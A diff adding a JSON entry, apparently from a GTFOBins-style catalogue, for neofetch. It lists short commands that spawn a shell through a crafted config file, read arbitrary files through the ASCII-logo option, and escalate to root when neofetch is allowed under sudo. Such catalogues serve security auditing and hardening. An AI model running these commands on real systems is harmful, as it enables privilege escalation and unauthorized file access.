@@ -1,0 +1,20 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.",
+        "code": "LFILE=file_to_read\nneofetch --ascii $LFILE\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
+      }
+    ]
+  }
+}
